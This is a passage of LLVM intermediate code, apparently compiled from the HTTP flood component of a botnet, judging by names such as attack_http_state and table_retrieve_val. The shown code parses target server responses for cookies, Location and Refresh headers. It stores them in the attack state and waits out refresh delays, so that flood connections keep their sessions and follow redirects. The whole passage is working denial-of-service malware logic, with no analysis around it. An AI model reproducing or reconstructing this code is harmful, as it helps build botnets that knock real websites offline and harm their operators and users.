  %1327 = load i32, i32* %37, align 4
  %1328 = load i32, i32* %47, align 4
  %1329 = add nsw i32 %1327, %1328
  %1330 = sext i32 %1329 to i64
  %1331 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1330
  store i8* %1331, i8** %49, align 8
  %1332 = load i32, i32* %48, align 4
  %1333 = icmp sge i32 %1332, 2
  br i1 %1333, label %1334, label %1337

1334:                                             ; preds = %1326
  %1335 = load i32, i32* %48, align 4
  %1336 = sub nsw i32 %1335, 2
  store i32 %1336, i32* %48, align 4
  br label %1337

1337:                                             ; preds = %1334, %1326
  %1338 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1339 = load i32, i32* %37, align 4
  %1340 = sext i32 %1339 to i64
  %1341 = getelementptr inbounds i8, i8* %1338, i64 %1340
  %1342 = load i32, i32* %47, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds i8, i8* %1341, i64 %1343
  %1345 = load i32, i32* %12, align 4
  %1346 = load i32, i32* %37, align 4
  %1347 = sub nsw i32 %1345, %1346
  %1348 = load i32, i32* %47, align 4
  %1349 = sub nsw i32 %1347, %1348
  %1350 = call i32 @util_memsearch(i8* noundef %1344, i32 noundef %1349, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 noundef 1)
  %1351 = icmp sgt i32 %1350, 0
  br i1 %1351, label %1352, label %1367

1352:                                             ; preds = %1337
  %1353 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1354 = load i32, i32* %37, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds i8, i8* %1353, i64 %1355
  %1357 = load i32, i32* %47, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds i8, i8* %1356, i64 %1358
  %1360 = load i32, i32* %12, align 4
  %1361 = load i32, i32* %37, align 4
  %1362 = sub nsw i32 %1360, %1361
  %1363 = load i32, i32* %47, align 4
  %1364 = sub nsw i32 %1362, %1363
  %1365 = call i32 @util_memsearch(i8* noundef %1359, i32 noundef %1364, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 noundef 1)
  %1366 = sub nsw i32 %1365, 1
  store i32 %1366, i32* %48, align 4
  br label %1367

1367:                                             ; preds = %1352, %1337
  %1368 = load i32, i32* %37, align 4
  %1369 = load i32, i32* %47, align 4
  %1370 = add nsw i32 %1368, %1369
  %1371 = load i32, i32* %48, align 4
  %1372 = add nsw i32 %1370, %1371
  %1373 = sext i32 %1372 to i64
  %1374 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1373
  store i8 0, i8* %1374, align 1
  store i32 0, i32* %10, align 4
  br label %1375

1375:                                             ; preds = %1390, %1367
  %1376 = load i32, i32* %10, align 4
  %1377 = load i8*, i8** %49, align 8
  %1378 = call i32 @util_strlen(i8* noundef %1377)
  %1379 = icmp slt i32 %1376, %1378
  br i1 %1379, label %1380, label %1393

1380:                                             ; preds = %1375
  %1381 = load i8*, i8** %49, align 8
  %1382 = load i32, i32* %10, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds i8, i8* %1381, i64 %1383
  %1385 = load i8, i8* %1384, align 1
  %1386 = sext i8 %1385 to i32
  %1387 = icmp eq i32 %1386, 61
  br i1 %1387, label %1388, label %1389

1388:                                             ; preds = %1380
  br label %1393

1389:                                             ; preds = %1380
  br label %1390

1390:                                             ; preds = %1389
  %1391 = load i32, i32* %10, align 4
  %1392 = add nsw i32 %1391, 1
  store i32 %1392, i32* %10, align 4
  br label %1375, !llvm.loop !13

1393:                                             ; preds = %1388, %1375
  %1394 = load i8*, i8** %49, align 8
  %1395 = load i32, i32* %10, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds i8, i8* %1394, i64 %1396
  %1398 = load i8, i8* %1397, align 1
  %1399 = sext i8 %1398 to i32
  %1400 = icmp eq i32 %1399, 61
  br i1 %1400, label %1401, label %1449

1401:                                             ; preds = %1393
  %1402 = load i32, i32* %10, align 4
  store i32 %1402, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1403

1403:                                             ; preds = %1422, %1401
  %1404 = load i32, i32* %10, align 4
  %1405 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1405, i32 0, i32 15
  %1407 = load i32, i32* %1406, align 4
  %1408 = icmp slt i32 %1404, %1407
  br i1 %1408, label %1409, label %1425

1409:                                             ; preds = %1403
  %1410 = load i8*, i8** %49, align 8
  %1411 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1411, i32 0, i32 16
  %1413 = load i32, i32* %10, align 4
  %1414 = sext i32 %1413 to i64
  %1415 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1412, i64 0, i64 %1414
  %1416 = getelementptr inbounds [128 x i8], [128 x i8]* %1415, i64 0, i64 0
  %1417 = load i32, i32* %50, align 4
  %1418 = call signext i8 @util_strncmp(i8* noundef %1410, i8* noundef %1416, i32 noundef %1417)
  %1419 = icmp ne i8 %1418, 0
  br i1 %1419, label %1420, label %1421

1420:                                             ; preds = %1409
  store i32 1, i32* %51, align 4
  br label %1425

1421:                                             ; preds = %1409
  br label %1422

1422:                                             ; preds = %1421
  %1423 = load i32, i32* %10, align 4
  %1424 = add nsw i32 %1423, 1
  store i32 %1424, i32* %10, align 4
  br label %1403, !llvm.loop !14

1425:                                             ; preds = %1420, %1403
  %1426 = load i32, i32* %51, align 4
  %1427 = icmp ne i32 %1426, 0
  br i1 %1427, label %1448, label %1428

1428:                                             ; preds = %1425
  %1429 = load i8*, i8** %49, align 8
  %1430 = call i32 @util_strlen(i8* noundef %1429)
  %1431 = icmp slt i32 %1430, 128
  br i1 %1431, label %1432, label %1447

1432:                                             ; preds = %1428
  %1433 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1433, i32 0, i32 16
  %1435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1435, i32 0, i32 15
  %1437 = load i32, i32* %1436, align 4
  %1438 = sext i32 %1437 to i64
  %1439 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1434, i64 0, i64 %1438
  %1440 = getelementptr inbounds [128 x i8], [128 x i8]* %1439, i64 0, i64 0
  %1441 = load i8*, i8** %49, align 8
  %1442 = call i32 @util_strcpy(i8* noundef %1440, i8* noundef %1441)
  %1443 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1444 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1443, i32 0, i32 15
  %1445 = load i32, i32* %1444, align 4
  %1446 = add nsw i32 %1445, 1
  store i32 %1446, i32* %1444, align 4
  br label %1447

1447:                                             ; preds = %1432, %1428
  br label %1448

1448:                                             ; preds = %1447, %1425
  br label %1449

1449:                                             ; preds = %1448, %1393
  br label %1450

1450:                                             ; preds = %1449, %1310
  %1451 = load i32, i32* %47, align 4
  %1452 = load i32, i32* %37, align 4
  %1453 = add nsw i32 %1452, %1451
  store i32 %1453, i32* %37, align 4
  br label %1275, !llvm.loop !15

1454:                                             ; preds = %1289
  %1455 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1456 = load i32, i32* %12, align 4
  %1457 = call i8* @table_retrieve_val(i32 noundef 45, i32* noundef null)
  %1458 = call i32 @util_stristr(i8* noundef %1455, i32 noundef %1456, i8* noundef %1457)
  %1459 = icmp ne i32 %1458, -1
  br i1 %1459, label %1460, label %1639

1460:                                             ; preds = %1454
  %1461 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1462 = load i32, i32* %12, align 4
  %1463 = call i8* @table_retrieve_val(i32 noundef 45, i32* noundef null)
  %1464 = call i32 @util_stristr(i8* noundef %1461, i32 noundef %1462, i8* noundef %1463)
  store i32 %1464, i32* %52, align 4
  %1465 = load i32, i32* %52, align 4
  %1466 = sext i32 %1465 to i64
  %1467 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1466
  %1468 = load i8, i8* %1467, align 1
  %1469 = sext i8 %1468 to i32
  %1470 = icmp eq i32 %1469, 32
  br i1 %1470, label %1471, label %1474

1471:                                             ; preds = %1460
  %1472 = load i32, i32* %52, align 4
  %1473 = add nsw i32 %1472, 1
  store i32 %1473, i32* %52, align 4
  br label %1474

1474:                                             ; preds = %1471, %1460
  %1475 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1476 = load i32, i32* %52, align 4
  %1477 = sext i32 %1476 to i64
  %1478 = getelementptr inbounds i8, i8* %1475, i64 %1477
  %1479 = load i32, i32* %12, align 4
  %1480 = load i32, i32* %52, align 4
  %1481 = sub nsw i32 %1479, %1480
  %1482 = call i32 @util_memsearch(i8* noundef %1478, i32 noundef %1481, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1482, i32* %53, align 4
  %1483 = load i32, i32* %53, align 4
  %1484 = icmp ne i32 %1483, -1
  br i1 %1484, label %1485, label %1638

1485:                                             ; preds = %1474
  %1486 = load i32, i32* %52, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1487
  store i8* %1488, i8** %54, align 8
  %1489 = load i32, i32* %53, align 4
  %1490 = icmp sge i32 %1489, 2
  br i1 %1490, label %1491, label %1494

1491:                                             ; preds = %1485
  %1492 = load i32, i32* %53, align 4
  %1493 = sub nsw i32 %1492, 2
  store i32 %1493, i32* %53, align 4
  br label %1494

1494:                                             ; preds = %1491, %1485
  %1495 = load i32, i32* %52, align 4
  %1496 = load i32, i32* %53, align 4
  %1497 = add nsw i32 %1495, %1496
  %1498 = sext i32 %1497 to i64
  %1499 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1498
  store i8 0, i8* %1499, align 1
  %1500 = load i32, i32* %53, align 4
  %1501 = add nsw i32 %1500, 1
  store i32 %1501, i32* %53, align 4
  %1502 = load i8*, i8** %54, align 8
  %1503 = load i32, i32* %53, align 4
  %1504 = call i32 @util_memsearch(i8* noundef %1502, i32 noundef %1503, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 noundef 4)
  %1505 = icmp eq i32 %1504, 4
  br i1 %1505, label %1506, label %1596

1506:                                             ; preds = %1494
  store i32 7, i32* %10, align 4
  %1507 = load i8*, i8** %54, align 8
  %1508 = getelementptr inbounds i8, i8* %1507, i64 4
  %1509 = load i8, i8* %1508, align 1
  %1510 = sext i8 %1509 to i32
  %1511 = icmp eq i32 %1510, 115
  br i1 %1511, label %1512, label %1515

1512:                                             ; preds = %1506
  %1513 = load i32, i32* %10, align 4
  %1514 = add nsw i32 %1513, 1
  store i32 %1514, i32* %10, align 4
  br label %1515

1515:                                             ; preds = %1512, %1506
  %1516 = load i8*, i8** %54, align 8
  %1517 = load i8*, i8** %54, align 8
  %1518 = load i32, i32* %10, align 4
  %1519 = sext i32 %1518 to i64
  %1520 = getelementptr inbounds i8, i8* %1517, i64 %1519
  %1521 = load i32, i32* %53, align 4
  %1522 = load i32, i32* %10, align 4
  %1523 = sub nsw i32 %1521, %1522
  %1524 = sext i32 %1523 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 1 %1516, i8* align 1 %1520, i64 %1524, i1 false)
  store i32 0, i32* %10, align 4
  br label %1525

1525:                                             ; preds = %1546, %1515
  %1526 = load i8*, i8** %54, align 8
  %1527 = load i32, i32* %10, align 4
  %1528 = sext i32 %1527 to i64
  %1529 = getelementptr inbounds i8, i8* %1526, i64 %1528
  %1530 = load i8, i8* %1529, align 1
  %1531 = sext i8 %1530 to i32
  %1532 = icmp ne i32 %1531, 0
  br i1 %1532, label %1533, label %1549

1533:                                             ; preds = %1525
  %1534 = load i8*, i8** %54, align 8
  %1535 = load i32, i32* %10, align 4
  %1536 = sext i32 %1535 to i64
  %1537 = getelementptr inbounds i8, i8* %1534, i64 %1536
  %1538 = load i8, i8* %1537, align 1
  %1539 = sext i8 %1538 to i32
  %1540 = icmp eq i32 %1539, 47
  br i1 %1540, label %1541, label %1546

1541:                                             ; preds = %1533
  %1542 = load i8*, i8** %54, align 8
  %1543 = load i32, i32* %10, align 4
  %1544 = sext i32 %1543 to i64
  %1545 = getelementptr inbounds i8, i8* %1542, i64 %1544
  store i8 0, i8* %1545, align 1
  br label %1549

1546:                                             ; preds = %1533
  %1547 = load i32, i32* %10, align 4
  %1548 = add nsw i32 %1547, 1
  store i32 %1548, i32* %10, align 4
  br label %1525, !llvm.loop !16

1549:                                             ; preds = %1541, %1525
  %1550 = load i8*, i8** %54, align 8
  %1551 = call i32 @util_strlen(i8* noundef %1550)
  %1552 = icmp sgt i32 %1551, 0
  br i1 %1552, label %1553, label %1563

1553:                                             ; preds = %1549
  %1554 = load i8*, i8** %54, align 8
  %1555 = call i32 @util_strlen(i8* noundef %1554)
  %1556 = icmp slt i32 %1555, 128
  br i1 %1556, label %1557, label %1563

1557:                                             ; preds = %1553
  %1558 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1559 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1558, i32 0, i32 7
  %1560 = getelementptr inbounds [129 x i8], [129 x i8]* %1559, i64 0, i64 0
  %1561 = load i8*, i8** %54, align 8
  %1562 = call i32 @util_strcpy(i8* noundef %1560, i8* noundef %1561)
  br label %1563

1563:                                             ; preds = %1557, %1553, %1549
  %1564 = load i8*, i8** %54, align 8
  %1565 = load i32, i32* %10, align 4
  %1566 = add nsw i32 %1565, 1
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds i8, i8* %1564, i64 %1567
  %1569 = call i32 @util_strlen(i8* noundef %1568)
  %1570 = icmp slt i32 %1569, 256
  br i1 %1570, label %1571, label %1595

1571:                                             ; preds = %1563
  %1572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1572, i32 0, i32 6
  %1574 = getelementptr inbounds [257 x i8], [257 x i8]* %1573, i64 0, i64 0
  %1575 = getelementptr inbounds i8, i8* %1574, i64 1
  call void @util_zero(i8* noundef %1575, i32 noundef 255)
  %1576 = load i8*, i8** %54, align 8
  %1577 = load i32, i32* %10, align 4
  %1578 = add nsw i32 %1577, 1
  %1579 = sext i32 %1578 to i64
  %1580 = getelementptr inbounds i8, i8* %1576, i64 %1579
  %1581 = call i32 @util_strlen(i8* noundef %1580)
  %1582 = icmp sgt i32 %1581, 0
  br i1 %1582, label %1583, label %1594

1583:                                             ; preds = %1571
  %1584 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1585 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1584, i32 0, i32 6
  %1586 = getelementptr inbounds [257 x i8], [257 x i8]* %1585, i64 0, i64 0
  %1587 = getelementptr inbounds i8, i8* %1586, i64 1
  %1588 = load i8*, i8** %54, align 8
  %1589 = load i32, i32* %10, align 4
  %1590 = add nsw i32 %1589, 1
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds i8, i8* %1588, i64 %1591
  %1593 = call i32 @util_strcpy(i8* noundef %1587, i8* noundef %1592)
  br label %1594

1594:                                             ; preds = %1583, %1571
  br label %1595

1595:                                             ; preds = %1594, %1563
  br label %1635

1596:                                             ; preds = %1494
  %1597 = load i8*, i8** %54, align 8
  %1598 = getelementptr inbounds i8, i8* %1597, i64 0
  %1599 = load i8, i8* %1598, align 1
  %1600 = sext i8 %1599 to i32
  %1601 = icmp eq i32 %1600, 47
  br i1 %1601, label %1602, label %1634

1602:                                             ; preds = %1596
  %1603 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1603, i32 0, i32 6
  %1605 = getelementptr inbounds [257 x i8], [257 x i8]* %1604, i64 0, i64 0
  %1606 = getelementptr inbounds i8, i8* %1605, i64 1
  call void @util_zero(i8* noundef %1606, i32 noundef 255)
  %1607 = load i8*, i8** %54, align 8
  %1608 = load i32, i32* %10, align 4
  %1609 = add nsw i32 %1608, 1
  %1610 = sext i32 %1609 to i64
  %1611 = getelementptr inbounds i8, i8* %1607, i64 %1610
  %1612 = call i32 @util_strlen(i8* noundef %1611)
  %1613 = icmp sgt i32 %1612, 0
  br i1 %1613, label %1614, label %1633

1614:                                             ; preds = %1602
  %1615 = load i8*, i8** %54, align 8
  %1616 = load i32, i32* %10, align 4
  %1617 = add nsw i32 %1616, 1
  %1618 = sext i32 %1617 to i64
  %1619 = getelementptr inbounds i8, i8* %1615, i64 %1618
  %1620 = call i32 @util_strlen(i8* noundef %1619)
  %1621 = icmp slt i32 %1620, 256
  br i1 %1621, label %1622, label %1633

1622:                                             ; preds = %1614
  %1623 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1624 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1623, i32 0, i32 6
  %1625 = getelementptr inbounds [257 x i8], [257 x i8]* %1624, i64 0, i64 0
  %1626 = getelementptr inbounds i8, i8* %1625, i64 1
  %1627 = load i8*, i8** %54, align 8
  %1628 = load i32, i32* %10, align 4
  %1629 = add nsw i32 %1628, 1
  %1630 = sext i32 %1629 to i64
  %1631 = getelementptr inbounds i8, i8* %1627, i64 %1630
  %1632 = call i32 @util_strcpy(i8* noundef %1626, i8* noundef %1631)
  br label %1633

1633:                                             ; preds = %1622, %1614, %1602
  br label %1634

1634:                                             ; preds = %1633, %1596
  br label %1635

1635:                                             ; preds = %1634, %1595
  %1636 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1637 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1636, i32 0, i32 1
  store i8 1, i8* %1637, align 4
  br label %2453

1638:                                             ; preds = %1474
  br label %1639

1639:                                             ; preds = %1638, %1454
  %1640 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1641 = load i32, i32* %12, align 4
  %1642 = call i8* @table_retrieve_val(i32 noundef 44, i32* noundef null)
  %1643 = call i32 @util_stristr(i8* noundef %1640, i32 noundef %1641, i8* noundef %1642)
  %1644 = icmp ne i32 %1643, -1
  br i1 %1644, label %1645, label %1975

1645:                                             ; preds = %1639
  %1646 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1647 = load i32, i32* %12, align 4
  %1648 = call i8* @table_retrieve_val(i32 noundef 44, i32* noundef null)
  %1649 = call i32 @util_stristr(i8* noundef %1646, i32 noundef %1647, i8* noundef %1648)
  store i32 %1649, i32* %55, align 4
  %1650 = load i32, i32* %55, align 4
  %1651 = sext i32 %1650 to i64
  %1652 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1651
  %1653 = load i8, i8* %1652, align 1
  %1654 = sext i8 %1653 to i32
  %1655 = icmp eq i32 %1654, 32
  br i1 %1655, label %1656, label %1659

1656:                                             ; preds = %1645
  %1657 = load i32, i32* %55, align 4
  %1658 = add nsw i32 %1657, 1
  store i32 %1658, i32* %55, align 4
  br label %1659

1659:                                             ; preds = %1656, %1645
  %1660 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1661 = load i32, i32* %55, align 4
  %1662 = sext i32 %1661 to i64
  %1663 = getelementptr inbounds i8, i8* %1660, i64 %1662
  %1664 = load i32, i32* %12, align 4
  %1665 = load i32, i32* %55, align 4
  %1666 = sub nsw i32 %1664, %1665
  %1667 = call i32 @util_memsearch(i8* noundef %1663, i32 noundef %1666, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1667, i32* %56, align 4
  %1668 = load i32, i32* %56, align 4
  %1669 = icmp ne i32 %1668, -1
  br i1 %1669, label %1670, label %1974

1670:                                             ; preds = %1659
  %1671 = load i32, i32* %55, align 4
  %1672 = sext i32 %1671 to i64
  %1673 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1672
  store i8* %1673, i8** %57, align 8
  %1674 = load i32, i32* %56, align 4
  %1675 = icmp sge i32 %1674, 2
  br i1 %1675, label %1676, label %1679

1676:                                             ; preds = %1670
  %1677 = load i32, i32* %56, align 4
  %1678 = sub nsw i32 %1677, 2
  store i32 %1678, i32* %56, align 4
  br label %1679

1679:                                             ; preds = %1676, %1670
  %1680 = load i32, i32* %55, align 4
  %1681 = load i32, i32* %56, align 4
  %1682 = add nsw i32 %1680, %1681
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1683
  store i8 0, i8* %1684, align 1
  %1685 = load i32, i32* %56, align 4
  %1686 = add nsw i32 %1685, 1
  store i32 %1686, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1687

1687:                                             ; preds = %1713, %1679
  %1688 = load i8*, i8** %57, align 8
  %1689 = load i32, i32* %10, align 4
  %1690 = sext i32 %1689 to i64
  %1691 = getelementptr inbounds i8, i8* %1688, i64 %1690
  %1692 = load i8, i8* %1691, align 1
  %1693 = sext i8 %1692 to i32
  %1694 = icmp ne i32 %1693, 0
  br i1 %1694, label %1695, label %1711

1695:                                             ; preds = %1687
  %1696 = load i8*, i8** %57, align 8
  %1697 = load i32, i32* %10, align 4
  %1698 = sext i32 %1697 to i64
  %1699 = getelementptr inbounds i8, i8* %1696, i64 %1698
  %1700 = load i8, i8* %1699, align 1
  %1701 = sext i8 %1700 to i32
  %1702 = icmp sge i32 %1701, 48
  br i1 %1702, label %1703, label %1711

1703:                                             ; preds = %1695
  %1704 = load i8*, i8** %57, align 8
  %1705 = load i32, i32* %10, align 4
  %1706 = sext i32 %1705 to i64
  %1707 = getelementptr inbounds i8, i8* %1704, i64 %1706
  %1708 = load i8, i8* %1707, align 1
  %1709 = sext i8 %1708 to i32
  %1710 = icmp sle i32 %1709, 57
  br label %1711

1711:                                             ; preds = %1703, %1695, %1687
  %1712 = phi i1 [ false, %1695 ], [ false, %1687 ], [ %1710, %1703 ]
  br i1 %1712, label %1713, label %1716

1713:                                             ; preds = %1711
  %1714 = load i32, i32* %10, align 4
  %1715 = add nsw i32 %1714, 1
  store i32 %1715, i32* %10, align 4
  br label %1687, !llvm.loop !17

1716:                                             ; preds = %1711
  %1717 = load i8*, i8** %57, align 8
  %1718 = load i32, i32* %10, align 4
  %1719 = sext i32 %1718 to i64
  %1720 = getelementptr inbounds i8, i8* %1717, i64 %1719
  %1721 = load i8, i8* %1720, align 1
  %1722 = sext i8 %1721 to i32
  %1723 = icmp ne i32 %1722, 0
  br i1 %1723, label %1724, label %1973

1724:                                             ; preds = %1716
  store i32 0, i32* %58, align 4
  %1725 = load i8*, i8** %57, align 8
  %1726 = load i32, i32* %10, align 4
  %1727 = sext i32 %1726 to i64
  %1728 = getelementptr inbounds i8, i8* %1725, i64 %1727
  store i8 0, i8* %1728, align 1
  %1729 = load i32, i32* %10, align 4
  %1730 = add nsw i32 %1729, 1
  store i32 %1730, i32* %10, align 4
  %1731 = load i8*, i8** %57, align 8
  %1732 = load i32, i32* %10, align 4
  %1733 = sext i32 %1732 to i64
  %1734 = getelementptr inbounds i8, i8* %1731, i64 %1733
  %1735 = load i8, i8* %1734, align 1
  %1736 = sext i8 %1735 to i32
  %1737 = icmp eq i32 %1736, 32
  br i1 %1737, label %1738, label %1741

1738:                                             ; preds = %1724
  %1739 = load i32, i32* %10, align 4
  %1740 = add nsw i32 %1739, 1
  store i32 %1740, i32* %10, align 4
  br label %1741

1741:                                             ; preds = %1738, %1724
  %1742 = load i8*, i8** %57, align 8
  %1743 = load i32, i32* %10, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds i8, i8* %1742, i64 %1744
  %1746 = load i8*, i8** %57, align 8
  %1747 = load i32, i32* %10, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds i8, i8* %1746, i64 %1748
  %1750 = call i32 @util_strlen(i8* noundef %1749)
  %1751 = call i32 @util_stristr(i8* noundef %1745, i32 noundef %1750, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %1752 = icmp ne i32 %1751, -1
  br i1 %1752, label %1753, label %1766

1753:                                             ; preds = %1741
  %1754 = load i8*, i8** %57, align 8
  %1755 = load i32, i32* %10, align 4
  %1756 = sext i32 %1755 to i64
  %1757 = getelementptr inbounds i8, i8* %1754, i64 %1756
  %1758 = load i8*, i8** %57, align 8
  %1759 = load i32, i32* %10, align 4
  %1760 = sext i32 %1759 to i64
  %1761 = getelementptr inbounds i8, i8* %1758, i64 %1760
  %1762 = call i32 @util_strlen(i8* noundef %1761)
  %1763 = call i32 @util_stristr(i8* noundef %1757, i32 noundef %1762, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %1764 = load i32, i32* %10, align 4
  %1765 = add nsw i32 %1764, %1763
  store i32 %1765, i32* %10, align 4
  br label %1766

1766:                                             ; preds = %1753, %1741
  %1767 = load i8*, i8** %57, align 8
  %1768 = load i32, i32* %10, align 4
  %1769 = sext i32 %1768 to i64
  %1770 = getelementptr inbounds i8, i8* %1767, i64 %1769
  %1771 = load i8, i8* %1770, align 1
  %1772 = sext i8 %1771 to i32
  %1773 = icmp eq i32 %1772, 34
  br i1 %1773, label %1774, label %1806

1774:                                             ; preds = %1766
  %1775 = load i32, i32* %10, align 4
  %1776 = add nsw i32 %1775, 1
  store i32 %1776, i32* %10, align 4
  %1777 = load i8*, i8** %57, align 8
  %1778 = load i32, i32* %10, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds i8, i8* %1777, i64 %1779
  %1781 = load i8*, i8** %57, align 8
  %1782 = load i32, i32* %10, align 4
  %1783 = sext i32 %1782 to i64
  %1784 = getelementptr inbounds i8, i8* %1781, i64 %1783
  %1785 = call i32 @util_strlen(i8* noundef %1784)
  %1786 = sub nsw i32 %1785, 1
  %1787 = sext i32 %1786 to i64
  %1788 = getelementptr inbounds i8, i8* %1780, i64 %1787
  %1789 = load i8, i8* %1788, align 1
  %1790 = sext i8 %1789 to i32
  %1791 = icmp eq i32 %1790, 34
  br i1 %1791, label %1792, label %1805

1792:                                             ; preds = %1774
  %1793 = load i8*, i8** %57, align 8
  %1794 = load i32, i32* %10, align 4
  %1795 = sext i32 %1794 to i64
  %1796 = getelementptr inbounds i8, i8* %1793, i64 %1795
  %1797 = load i8*, i8** %57, align 8
  %1798 = load i32, i32* %10, align 4
  %1799 = sext i32 %1798 to i64
  %1800 = getelementptr inbounds i8, i8* %1797, i64 %1799
  %1801 = call i32 @util_strlen(i8* noundef %1800)
  %1802 = sub nsw i32 %1801, 1
  %1803 = sext i32 %1802 to i64
  %1804 = getelementptr inbounds i8, i8* %1796, i64 %1803
  store i8 0, i8* %1804, align 1
  br label %1805

1805:                                             ; preds = %1792, %1774
  br label %1806

1806:                                             ; preds = %1805, %1766
  %1807 = load i8*, i8** %57, align 8
  %1808 = call i32 @util_atoi(i8* noundef %1807, i32 noundef 10)
  store i32 %1808, i32* %58, align 4
  br label %1809

1809:                                             ; preds = %1824, %1806
  %1810 = load i32, i32* %58, align 4
  %1811 = icmp sgt i32 %1810, 0
  br i1 %1811, label %1812, label %1822

1812:                                             ; preds = %1809
  %1813 = load i32, i32* %58, align 4
  %1814 = icmp slt i32 %1813, 10
  br i1 %1814, label %1815, label %1822

1815:                                             ; preds = %1812
  %1816 = load i32, i32* %27, align 4
  %1817 = load i32, i32* %58, align 4
  %1818 = add i32 %1816, %1817
  %1819 = zext i32 %1818 to i64
  %1820 = call i64 @time(i64* noundef null) #6
  %1821 = icmp sgt i64 %1819, %1820
  br label %1822

1822:                                             ; preds = %1815, %1812, %1809
  %1823 = phi i1 [ false, %1812 ], [ false, %1809 ], [ %1821, %1815 ]
  br i1 %1823, label %1824, label %1826

1824:                                             ; preds = %1822
  %1825 = call i32 @sleep(i32 noundef 1)
  br label %1809, !llvm.loop !18

1826:                                             ; preds = %1822
  %1827 = load i8*, i8** %57, align 8
  %1828 = load i32, i32* %10, align 4
  %1829 = sext i32 %1828 to i64
  %1830 = getelementptr inbounds i8, i8* %1827, i64 %1829
  store i8* %1830, i8** %57, align 8
  %1831 = load i8*, i8** %57, align 8
  %1832 = load i8*, i8** %57, align 8
  %1833 = call i32 @util_strlen(i8* noundef %1832)
  %1834 = call i32 @util_stristr(i8* noundef %1831, i32 noundef %1833, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  %1835 = icmp eq i32 %1834, 4
  br i1 %1835, label %1836, label %1926

1836:                                             ; preds = %1826
  store i32 7, i32* %10, align 4
  %1837 = load i8*, i8** %57, align 8
  %1838 = getelementptr inbounds i8, i8* %1837, i64 4
  %1839 = load i8, i8* %1838, align 1
  %1840 = sext i8 %1839 to i32
  %1841 = icmp eq i32 %1840, 115
  br i1 %1841, label %1842, label %1845

1842:                                             ; preds = %1836
  %1843 = load i32, i32* %10, align 4
  %1844 = add nsw i32 %1843, 1
  store i32 %1844, i32* %10, align 4
  br label %1845

